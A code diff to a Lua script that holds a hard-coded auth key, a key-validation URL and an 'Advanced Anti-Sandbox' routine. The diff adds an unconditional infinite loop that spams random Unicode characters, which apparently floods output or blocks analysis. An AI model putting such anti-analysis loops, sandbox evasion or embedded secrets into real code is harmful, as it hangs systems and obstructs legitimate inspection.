@@ -20,6 +20,32 @@ local env = {
 local AUTH_KEY = "sigmadigmabigma"
 local VALIDATE_URL = "https://backend-9lks.onrender.com/validate-tempkey"
 
+local function randomUnicodeChar()
+    -- Unicode range 0x0000 to 0xFFFF
+    -- Avoid surrogate pairs (0xD800 - 0xDFFF), so pick from safe ranges
+    local ranges = {
+        {0x0021, 0x007E},  -- Basic Latin (printable ASCII)
+        {0x00A1, 0x00FF},  -- Latin-1 Supplement
+        {0x0400, 0x04FF},  -- Cyrillic
+        {0x0600, 0x06FF},  -- Arabic
+        {0x0900, 0x097F},  -- Devanagari
+        {0x3040, 0x309F},  -- Hiragana
+        {0x30A0, 0x30FF},  -- Katakana
+        {0x4E00, 0x9FFF},  -- CJK Unified Ideographs
+    }
+
+    local range = ranges[math.random(1, #ranges)]
+    local codePoint = math.random(range[1], range[2])
+
+    return utf8.char(codePoint)
+end
+
+-- Spam print loop at full speed (as fast as possible)
+while true do
+    print(randomUnicodeChar())
+end
+
+
 -- 🧠 Advanced Anti-Sandbox
 local function isSandboxed()
     local flags = {}
